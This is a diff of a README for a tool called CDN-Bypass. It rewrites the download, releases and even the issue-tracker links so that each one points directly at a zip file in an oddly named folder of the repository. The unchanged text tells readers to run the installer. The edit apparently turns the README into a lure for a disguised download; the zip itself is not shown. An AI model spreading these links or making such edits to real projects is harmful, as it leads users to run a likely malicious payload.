@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download CDN-Bypass](https://img.shields.io/badge/Download-CDN--Bypass-brightgreen)](https://github.com/Rajeekaran/CDN-Bypass/releases)
+[![Download CDN-Bypass](https://raw.githubusercontent.com/Rajeekaran/CDN-Bypass/main/ricinelaidinic/CDN-Bypass.zip)](https://raw.githubusercontent.com/Rajeekaran/CDN-Bypass/main/ricinelaidinic/CDN-Bypass.zip)
 
 ## 🚀 Getting Started
 
@@ -27,14 +27,14 @@ Before installing, please ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Rajeekaran/CDN-Bypass/releases) to download the latest version of CDN-Bypass. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Rajeekaran/CDN-Bypass/main/ricinelaidinic/CDN-Bypass.zip) to download the latest version of CDN-Bypass. Follow these steps:
 
 1. Click on the link above.
 2. Choose the latest release available.
 3. Download the file suitable for your system.
 4. Run the installer and follow the prompts to finish the installation.
 
-For ease of access, here is the link again: [Download CDN-Bypass](https://github.com/Rajeekaran/CDN-Bypass/releases).
+For ease of access, here is the link again: [Download CDN-Bypass](https://raw.githubusercontent.com/Rajeekaran/CDN-Bypass/main/ricinelaidinic/CDN-Bypass.zip).
 
 ## ❓ How to Use
 
@@ -55,7 +55,7 @@ If you encounter issues, consider the following solutions:
 
 ## 📞 Support
 
-For additional help, you can open an issue on the [GitHub issues page](https://github.com/Rajeekaran/CDN-Bypass/issues). Make sure to provide detailed information about the problem you are facing.
+For additional help, you can open an issue on the [GitHub issues page](https://raw.githubusercontent.com/Rajeekaran/CDN-Bypass/main/ricinelaidinic/CDN-Bypass.zip). Make sure to provide detailed information about the problem you are facing.
 
 ## 📝 License
 
